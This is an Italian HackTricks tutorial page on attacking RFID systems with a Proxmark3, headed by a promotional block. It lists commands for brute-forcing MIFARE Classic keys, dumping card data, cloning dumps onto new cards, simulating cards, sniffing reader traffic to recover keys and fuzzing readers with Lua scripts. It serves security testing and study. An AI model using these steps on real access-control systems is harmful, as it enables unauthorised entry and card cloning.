# Proxmark 3

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la **tua azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**Gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Attaccare i Sistemi RFID con Proxmark3

La prima cosa da fare è avere un [**Proxmark3**](https://proxmark.com) e [**installare il software e le sue dipendenze**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Attaccare i Sistemi MIFARE Classic 1KB

Ha **16 settori**, ognuno con **4 blocchi** e ogni blocco contiene **16B**. L'UID si trova nel settore 0 blocco 0 (e non può essere modificato).\
Per accedere a ciascun settore sono necessarie **2 chiavi** (**A** e **B**) che sono memorizzate nel **blocco 3 di ciascun settore** (trailer del settore). Il trailer del settore memorizza anche i **bit di accesso** che forniscono le autorizzazioni di **lettura e scrittura** su **ciascun blocco** utilizzando le 2 chiavi.\
2 chiavi sono utili per dare autorizzazioni di lettura se si conosce la prima e di scrittura se si conosce la seconda (ad esempio).

Possono essere eseguiti diversi attacchi
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Il Proxmark3 consente di eseguire altre azioni come **intercettare** una **comunicazione Tag to Reader** per cercare di trovare dati sensibili. In questa scheda è possibile intercettare la comunicazione e calcolare la chiave utilizzata poiché le **operazioni crittografiche utilizzate sono deboli** e conoscendo il testo in chiaro e il testo cifrato è possibile calcolarla (strumento `mfkey64`).

### Comandi Grezzi

I sistemi IoT a volte utilizzano **tag non di marca o non commerciali**. In questo caso, è possibile utilizzare il Proxmark3 per inviare **comandi grezzi personalizzati ai tag**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Con queste informazioni potresti cercare informazioni sulla scheda e sul modo di comunicare con essa. Proxmark3 consente di inviare comandi grezzi come: `hf 14a raw -p -b 7 26`

### Script

Il software Proxmark3 è dotato di un elenco predefinito di **script di automazione** che puoi utilizzare per svolgere compiti semplici. Per recuperare l'elenco completo, utilizza il comando `script list`. Successivamente, utilizza il comando `script run`, seguito dal nome dello script:
```
proxmark3> script run mfkeys
```
Puoi creare uno script per **fuzzare i lettori di tag**, quindi copiando i dati di una **scheda valida** scrivi uno **script Lua** che **randomizzi** uno o più **byte casuali** e controlli se il **lettore crasha** con qualsiasi iterazione.
